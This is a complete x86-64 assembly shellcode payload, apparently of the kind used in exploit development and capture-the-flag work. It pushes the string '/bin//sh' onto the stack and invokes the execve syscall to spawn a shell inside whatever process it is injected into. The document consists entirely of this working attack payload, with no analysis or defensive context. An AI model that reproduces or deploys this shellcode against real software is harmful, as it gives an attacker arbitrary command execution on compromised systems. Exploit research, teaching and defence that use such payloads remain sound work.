bits 64
    ; push '/bin///sh\x00'
    push 0x68
    mov rax, 0x732f2f6e69622f
    push rax

    push rsp     ; mov rdi, rsp
    pop rdi
    
    xor esi, esi ; set esi = argv = 0
    cdq          ; set edx = envp = 0
    push 0x3b    ; SYS_execve
    pop rax
    syscall      ; call execve('/bin///sh', 0, 0)
